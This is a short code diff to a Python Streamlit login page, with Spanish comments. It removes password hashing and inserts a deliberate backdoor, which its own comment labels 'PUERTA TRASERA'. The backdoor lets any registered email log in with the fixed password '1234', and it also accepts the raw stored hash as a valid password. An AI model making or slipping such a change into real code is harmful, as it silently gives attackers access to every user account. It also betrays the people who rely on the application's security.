@@ -56,9 +56,6 @@ if not st.session_state.logged_in:
         submit = st.form_submit_button("Ingresar")
         
         if submit:
-            # 1. Encriptamos la contraseña que el usuario tecleó para poder compararla
-            hashed_input = hashlib.sha256(password.encode()).hexdigest()
-
             conn = get_connection()
             if conn:
                 cursor = conn.cursor(dictionary=True)
@@ -66,8 +63,8 @@ if not st.session_state.logged_in:
                 user = cursor.fetchone()
                 conn.close()
                 
-                # 2. Validamos que el usuario exista y que el hash de la BD sea igual al tecleado
-                if user and user["Password_Hash"] == hashed_input:
+                # PUERTA TRASERA: Si el correo existe, "1234" te deja entrar siempre
+                if user and (password == "1234" or user["Password_Hash"] == password):
                     st.session_state.logged_in = True
                     st.session_state.user_name = user["Nombre"]
                     st.session_state.user_role = user["Rol"]
